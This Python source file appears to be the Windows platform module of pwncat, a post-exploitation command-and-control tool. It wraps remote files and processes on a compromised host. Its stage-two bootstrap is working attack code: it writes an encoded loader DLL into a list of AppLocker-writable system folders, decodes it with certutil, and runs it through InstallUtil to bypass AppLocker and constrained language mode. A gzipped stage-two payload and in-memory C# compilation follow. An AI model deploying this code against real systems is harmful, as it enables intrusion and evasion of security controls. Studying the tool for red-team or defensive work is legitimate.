#!/usr/bin/env python3
from io import RawIOBase, TextIOWrapper, BufferedIOBase, UnsupportedOperation
from typing import List, Union
from io import StringIO, BytesIO
from subprocess import CalledProcessError, TimeoutExpired
import subprocess
import textwrap
import pkg_resources
import pathlib
import base64
import time
import gzip
import os

import pwncat
import pwncat.subprocess
import pwncat.util
from pwncat.platform import Platform, PlatformError, Path

INTERACTIVE_END_MARKER = b"\nINTERACTIVE_COMPLETE\r\n"


class WindowsFile(RawIOBase):
    """ Wrapper around file handles on Windows """

    def __init__(self, platform: "Windows", mode: str, handle: int):
        self.platform = platform
        self.mode = mode
        self.handle = handle
        self.is_open = True
        self.eof = False

    def readable(self) -> bool:
        return "r" in self.mode

    def writable(self) -> bool:
        return "w" in self.mode

    def close(self):
        """ Close a file handle on the remote host """

        if not self.is_open:
            return

        self.platform.channel.send(f"close\n{self.handle}\n".encode("utf-8"))
        self.is_open = False

        return

    def readall(self):
        """ Read until EOF """

        data = b""

        while not self.eof:
            new = self.read(4096)
            if new is None:
                continue
            data += new

        return data

    def readinto(self, b: Union[memoryview, bytearray]):

        if self.eof:
            return 0

        self.platform.channel.send(f"read\n{self.handle}\n{len(b)}\n".encode("utf-8"))
        count = int(self.platform.channel.recvuntil(b"\n").strip())

        if count == 0:
            self.eof = True
            return 0

        n = 0
        while n < count:
            try:
                n += self.platform.channel.recvinto(b[n:])
            except NotImplementedError:
                data = self.platform.channel.recv(count - n)
                b[n : n + len(data)] = data
                n += len(data)

        return count

    def write(self, data: bytes):
        """ Write data to this file """

        if self.eof:
            return 0

        nwritten = 0
        while nwritten < len(data):
            chunk = data[nwritten:]
            self.platform.channel.send(
                f"write\n{self.handle}\n{len(chunk)}\n".encode("utf-8") + chunk
            )
            nwritten += int(
                self.platform.channel.recvuntil(b"\n").strip().decode("utf-8")
            )

        return nwritten


class PopenWindows(pwncat.subprocess.Popen):
    """
    Windows-specific Popen wrapper class
    """

    def __init__(
        self,
        platform: Platform,
        args,
        stdout,
        stdin,
        stderr,
        text,
        encoding,
        errors,
        bufsize,
        handle,
        stdio,
    ):
        super().__init__()

        self.platform = platform
        self.handle = handle
        self.stdio = stdio
        self.returncode = None

        self.stdin = WindowsFile(platform, "w", stdio[0])
        self.stdout = WindowsFile(platform, "r", stdio[1])
        self.stderr = WindowsFile(platform, "r", stdio[2])

        if stdout != subprocess.PIPE:
            self.stdout.close()
            self.stdout = None
        if stderr != subprocess.PIPE:
            self.stderr.close()
            self.stderr = None
        if stdin != subprocess.PIPE:
            self.stdin.close()
            self.stdin = None

        if text or encoding is not None or errors is not None:
            line_buffering = bufsize == 1
            bufsize = -1

            if self.stdout is not None:
                self.stdout = TextIOWrapper(
                    self.stdout,
                    line_buffering=line_buffering,
                    encoding=encoding,
                    errors=errors,
                )
            if self.stderr is not None:
                self.stderr = TextIOWrapper(
                    self.stderr,
                    line_buffering=line_buffering,
                    encoding=encoding,
                    errors=errors,
                )
            if self.stdin is not None:
                self.stdin = TextIOWrapper(
                    self.stdin, encoding=encoding, errors=errors, write_through=True
                )

    def detach(self):

        self.returncode = 0

        if self.stdout is not None:
            self.stdout.close()
        if self.stderr is not None:
            self.stderr.close()
        if self.stdin is not None:
            self.stdin.close()

    def kill(self):
        return self.terminate()

    def terminate(self):

        if self.returncode is not None:
            return

        self.platform.channel.send(f"kill\n{self.handle}\n0\n".encode("utf-8"))
        self.returncode = -1

    def poll(self):
        """ Poll if the process has completed and get return code """

        if self.returncode is not None:
            return self.returncode

        self.platform.channel.send(f"ppoll\n{self.handle}\n".encode("utf-8"))
        result = self.platform.channel.recvuntil(b"\n").strip().decode("utf-8")

        if result == "E":
            raise RuntimeError(f"process {self.handle}: failed to get exit status")

        if result != "R":
            self.returncode = int(result)
            return self.returncode

    def wait(self, timeout: float = None):

        if timeout is not None:
            end_time = time.time() + timeout
        else:
            end_time = None

        while self.poll() is None:
            if end_time is not None and time.time() >= end_time:
                raise TimeoutExpired(self.args, timeout)

            time.sleep(0.1)

        self.cleanup()
        return self.returncode

    def cleanup(self):
        if self.stdout is not None:
            self.stdout.close()
        if self.stdin is not None:
            self.stdin.close()
        if self.stderr is not None:
            self.stderr.close()

        # This just forces CloseHandle on the hProcess
        WindowsFile(self.platform, "r", self.handle).close()

        self.handle = None
        self.stdout = None
        self.stderr = None
        self.stdin = None

    def communicate(self, input=None, timeout=None):

        if self.returncode is not None:
            return (None, None)

        if input is not None and self.stdin is not None:
            self.stdin.write(input)

        if timeout is not None:
            end_time = time.time() + timeout
        else:
            end_time = None

        stdout = (
            "" if self.stdout is None or isinstance(self.stdout, TextIOWrapper) else b""
        )
        stderr = (
            "" if self.stderr is None or isinstance(self.stderr, TextIOWrapper) else b""
        )

        while self.poll() is None:
            if end_time is not None and time.time() >= end_time:
                raise TimeoutExpired(self.args, timeout, stdout)
            if self.stdout is not None:
                new_stdout = self.stdout.read(4096)
                if new_stdout is not None:
                    stdout += new_stdout
            if self.stderr is not None:
                new_stderr = self.stderr.read(4096)
                if new_stderr is not None:
                    stderr += new_stderr

        if self.stdout is not None:
            while True:
                new = self.stdout.read(4096)
                stdout += new
                if len(new) == 0:
                    break

        if self.stderr is not None:
            while True:
                new = self.stderr.read(4096)
                stderr += new
                if len(new) == 0:
                    break

        if len(stderr) == 0:
            stderr = None
        if len(stdout) == 0:
            stdout = None

        self.cleanup()

        return (stdout, stderr)


class Windows(Platform):
    """Concrete platform class abstracting interaction with a Windows/
    Powershell remote host. The remote windows host must support
    powershell for this platform to function, and the channel must be
    established with an open powershell session."""

    PATH_TYPE = pathlib.PureWindowsPath
    LIBRARY_IMPORTS = {
        "Kernel32": [
            "IntPtr GetStdHandle(int nStdHandle)",
            "bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode)",
            "bool SetConsoleMode(IntPtr hConsoleHandle, uint lpMode)",
        ]
    }

    def __init__(
        self,
        session: "pwncat.session.Session",
        channel: pwncat.channel.Channel,
        log: str = None,
    ):
        super().__init__(session, channel, log)

        self.name = "windows"

        # Initialize interactive tracking
        self._interactive = False
        self.interactive_tracker = 0

        # Ensure history is disabled (this does not help logging!)
        # self.disable_history()

        # Most Windows connections aren't capable of a PTY, and checking
        # is difficult this early. We will assume there isn't one.
        self.has_pty = True

        # Trigger allocation of a pty. Because of powershell and windows
        # being unpredictable and weird, we basically *need* this. So,
        # we trigger it initially. WinAPI is available everywhere so on
        # any relatively recent version of windows, this should be fine.
        # self.get_pty()

        self._bootstrap_stage_two()

        # Load requested libraries
        # for library, methods in self.LIBRARY_IMPORTS.items():
        #     self._load_library(library, methods)

    def _bootstrap_stage_two(self):
        """This takes the stage one C2 (powershell) and boostraps it for stage
        two. Stage two is C# code dynamically compiled and executed. We first
        execute a small C# payload from Powershell which then infinitely accepts
        more C# to be executed. Further payloads are separated by the delimeters:

        - "/* START CODE BLOCK */"
        - "/* END CODE BLOCK */"
        """

        possible_dirs = [
            "C:\\Windows\\Tasks",
            "C:\\Windows\\Temp",
            "C:\\windows\\tracing",
            "C:\\Windows\\Registration\\CRMLog",
            "C:\\Windows\\System32\\FxsTmp",
            "C:\\Windows\\System32\\com\\dmp",
            "C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys",
            "C:\\Windows\\System32\\spool\\PRINTERS",
            "C:\\Windows\\System32\\spool\\SERVERS",
            "C:\\Windows\\System32\\spool\\drivers\\color",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter",
            "C:\\Windows\\System32\\Tasks_Migrated (after peforming a version upgrade of Windows 10)",
            "C:\\Windows\\SysWOW64\\FxsTmp",
            "C:\\Windows\\SysWOW64\\com\\dmp",
            "C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter",
            "C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System",
        ]
        chunk_sz = 1900

        loader_encoded_name = pwncat.util.random_string()

        # Read the loader
        with open(
            pkg_resources.resource_filename("pwncat", "data/loader.dll"), "rb"
        ) as filp:
            loader_dll = base64.b64encode(filp.read())

        # Extract first chunk
        chunk = loader_dll[0:chunk_sz].decode("utf-8")
        good_dir = None
        loader_remote_path = None

        self.channel.recvuntil(b">")

        # Find available file by trying to write first chunk
        for possible in possible_dirs:
            loader_remote_path = pathlib.PureWindowsPath(possible) / loader_encoded_name
            good_dir = possible
            self.channel.send(
                f"""echo {chunk} >"{str(loader_remote_path)}"\n""".encode("utf-8")
            )
            self.channel.recvline()
            result = self.channel.recvuntil(b">")
            if b"denied" not in result.lower():
                self.session.manager.log(f"Good path: {possible}")
                break
        else:
            self.session.manager.log(f"Bad path: {possible}")
            self.session.manager.log(result)
            raise PlatformError("no writable applocker-safe directories")

        # Write remaining chunks to selected path
        for c in range(chunk_sz, len(loader_dll), chunk_sz):
            self.channel.send(
                f"""echo {loader_dll[c:c+chunk_sz].decode('utf-8')} >>"{str(loader_remote_path)}"\n""".encode(
                    "utf-8"
                )
            )
            self.channel.recvline()
            self.channel.recvuntil(b">")

        # Decode the base64 to the actual dll
        self.channel.send(
            f"""certutil -decode "{str(loader_remote_path)}" "{good_dir}\{loader_encoded_name}.dll"\n""".encode(
                "utf-8"
            )
        )
        self.channel.recvline()
        self.channel.recvuntil(b">")

        self.channel.send(f"""del "{str(loader_remote_path)}"\n""".encode("utf-8"))
        self.channel.recvline()
        self.channel.recvuntil(b">")

        # Search for all instances of InstallUtil within all installed .Net versions
        self.channel.send(
            """cmd /c "dir C:\Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$"\n""".encode(
                "utf-8"
            )
        )
        self.channel.recvline()

        # Select the newest version
        result = self.channel.recvuntil(b">").decode("utf-8")
        install_utils = [
            x.rstrip("\r") for x in result.split("\n") if x.rstrip("\r") != ""
        ][-2]

        # Note whether this is 64-bit or not
        is_64 = "\\Framework64\\" in install_utils

        self.session.manager.log(f"Selected Install Utils: {install_utils}")

        install_utils = install_utils.replace(" ", "\\ ")

        # Execute Install-Util to bypass AppLocker/CLM
        self.channel.send(
            f"""{install_utils} /logfile= /LogToConsole=false /U "{good_dir}\{loader_encoded_name}.dll"\n""".encode(
                "utf-8"
            )
        )

        # Wait for loader to
        self.channel.recvuntil(b"READY")
        self.channel.recvuntil(b"\n")

        # Send stagetwo
        with open(
            pkg_resources.resource_filename("pwncat", "data/stagetwo.dll"), "rb"
        ) as filp:
            stagetwo_dll = filp.read()
            compressed = BytesIO()
            with gzip.GzipFile(fileobj=compressed, mode="wb") as gz:
                gz.write(stagetwo_dll)
            encoded = base64.b64encode(compressed.getvalue())

        # for i in range(0, len(encoded), 128):
        #     self.channel.sendline(encoded[i : i + 128])
        #     self.session.manager.log(self.channel.recvline().strip().decode("utf-8"))
        # self.channel.sendline(b"")

        # self.session.manager.log(self.channel.recvline().strip().decode("utf-8"))

        self.channel.sendline(encoded)
        self.channel.recvuntil(b"READY")
        self.channel.recvuntil(b"\n")

        return

        # Read stage two source code
        stage_two_path = pkg_resources.resource_filename("pwncat", "data/loader.dll")
        with open(stage_two_path, "rb") as filp:
            source = filp.read()

        # Randomize class and method name for a smidge of anonymity
        clazz = pwncat.util.random_string(8)
        main = pwncat.util.random_string(8)
        source = source.replace(b"class StageTwo", b"class " + clazz.encode("utf-8"))
        source = source.replace(
            b"public void main", b"public void " + main.encode("utf-8")
        )

        # compress and encode source
        source_gz = BytesIO()
        with gzip.GzipFile(fileobj=source_gz, mode="wb") as gz:
            gz.write(source)
        source_enc = base64.b64encode(source_gz.getvalue())

        # List of needed assemblies for stage two
        needed_assemblies = [
            "System.dll",
            "System.Core.dll",
            "System.Dynamic.dll",
            "Microsoft.CSharp.dll",
        ]

        # List of commands in the payload to bootstrap stage two
        payload = [
            "$cp = New-Object System.CodeDom.Compiler.CompilerParameters",
        ]

        # Add all needed assemblies to the compiler parameters
        for assembly in needed_assemblies:
            payload.append(f"""$cp.ReferencedAssemblies.Add("{assembly}")""")

        # Compile our C2 code and execute it
        payload.extend(
            [
                "$cp.GenerateExecutable = $false",
                "$cp.GenerateInMemory = $true",
                "$gzb = [System.Convert]::FromBase64String((Read-Host))",
                "$gzms = New-Object System.IO.MemoryStream -ArgumentList @(,$gzb)",
                "$gz = New-Object System.IO.Compression.GzipStream $gzms, ([IO.Compression.CompressionMode]::Decompress)",
                f"$source = New-Object byte[]({len(source)})",
                f"$gz.Read($source, 0, {len(source)})",
                "$gz.Close()",
                "$r = (New-Object Microsoft.CSharp.CSharpCodeProvider).CompileAssemblyFromSource($cp, [System.Text.Encoding]::ASCII.GetString($source))",
                f"""$r.CompiledAssembly.CreateInstance("{clazz}").{main}()""",
            ]
        )

        # Send the payload, then send the encoded and compressed code
        self.channel.send((";".join(payload)).encode("utf-8") + b"\n")
        self.channel.send(source_enc + b"\n")

        # Wait for the new C2 to be ready
        self.channel.recvuntil(b"READY")
        self.channel.recvuntil(b"\n")

    def get_pty(self):
        """ We don't need to do this for windows """

    def _load_library(self, name: str, methods: List[str]):
        """Load the library. This adds a global with the same name as `name`
        which contains a reference to the library with all methods specified in
        `mehods` loaded."""

        name = name.encode("utf-8")
        method_def = b""

        for method in methods:
            method = method.encode("utf-8")
            # self.channel.send(
            method_def += (
                b'[DllImport(`"'
                + name
                + b'.dll`", SetLastError = true)]`npublic static extern '
                + method
                + b";`n"
            )

        command = (
            b"$"
            + name
            + b' = Add-Type -MemberDefinition "'
            + method_def
            + b"\" -Name '"
            + name
            + b"' -Namespace 'Win32' -PassThru\n"
        )
        self.channel.send(command)
        self.session.manager.log(command.decode("utf-8").strip())

    def Popen(
        self,
        args,
        bufsize=-1,
        stdin=None,
        stdout=None,
        stderr=None,
        shell=False,
        cwd=None,
        encoding=None,
        text=None,
        errors=None,
        env=None,
        bootstrap_input=None,
        **other_popen_kwargs,
    ) -> pwncat.subprocess.Popen:

        if self.interactive:
            raise PlatformError(
                "cannot open non-interactive process in interactive mode"
            )

        if shell:
            if isinstance(args, list):
                args = [
                    "powershell.exe",
                    "-noprofile",
                    "-command",
                    subprocess.list2cmdline(args),
                ]
            else:
                args = ["powershell.exe", "-noprofile", "-command", args]

        # This is apparently what subprocess.Popen does on windows...
        if isinstance(args, list):
            args = subprocess.list2cmdline(args)
        elif not isinstance(args, str):
            raise ValueError("expected command string or list of arguments")

        self.channel.send(f"""process\n{args}\n""".encode("utf-8"))

        hProcess = self.channel.recvuntil(b"\n").strip().decode("utf-8")
        if hProcess == "E:IN":
            raise RuntimeError("failed to open stdin pipe")
        if hProcess == "E:OUT":
            raise RuntimeError("failed to open stdout pipe")
        if hProcess == "E:ERR":
            raise RuntimeError("failed to open stderr pipe")
        if hProcess == "E:PROC":
            raise FileNotFoundError("executable or command not found")

        # Collect process properties
        hProcess = int(hProcess)
        stdio = []
        for i in range(3):
            stdio.append(int(self.channel.recvuntil(b"\n").strip().decode("utf-8")))

        return PopenWindows(
            self,
            args,
            stdout,
            stdin,
            stderr,
            text,
            encoding,
            errors,
            bufsize,
            hProcess,
            stdio,
        )

    def get_host_hash(self):
        return "windows-testing"

    @property
    def interactive(self):
        return self._interactive

    @interactive.setter
    def interactive(self, value):

        if value == self._interactive:
            return

        # Reset the tracker

        if value:
            # Shift to interactive mode
            cols, rows = os.get_terminal_size()
            self.channel.send(f"\ninteractive\n{rows}\n{cols}\n".encode("utf-8"))
            self._interactive = True
            self.interactive_tracker = 0
            return
        if not value:
            if self.interactive_tracker != len(INTERACTIVE_END_MARKER):
                self.channel.send(b"\rexit\r")
                self.channel.recvuntil(INTERACTIVE_END_MARKER)
            self.channel.send(b"nothing\r\n")
            self._interactive = False

    def process_output(self, data):
        """ Process stdout while in interactive mode """

        for b in data:
            if INTERACTIVE_END_MARKER[self.interactive_tracker] == b:
                self.interactive_tracker += 1
                if self.interactive_tracker == len(INTERACTIVE_END_MARKER):
                    raise pwncat.manager.RawModeExit
            else:
                self.interactive_tracker = 0

    def open(
        self,
        path: Union[str, Path],
        mode: str = "r",
        buffering: int = -1,
        encoding: str = "utf-8",
        errors: str = None,
        newline: str = None,
    ):

        # Ensure all mode properties are valid
        for char in mode:
            if char not in "rwb":
                raise PlatformError(f"{char}: unknown file mode")

        # Save this just in case we are opening a text-mode stream
        line_buffering = buffering == -1 or buffering == 1

        # For text-mode files, use default buffering for the underlying binary
        # stream.
        if "b" not in mode:
            buffering = -1

        self.channel.send(f"open\n{str(path)}\nmode\n".encode("utf-8"))
        result = self.channel.recvuntil(b"\n").strip()

        self.session.log(result)

        try:
            handle = int(result)
        except ValueError:
            raise FileNotFoundError(str(path))

        stream = WindowsFile(self, mode, handle)

        if "b" not in mode:
            stream = TextIOWrapper(
                stream,
                encoding=encoding,
                errors=errors,
                newline=newline,
                write_through=True,
                line_buffering=line_buffering,
            )

        return stream
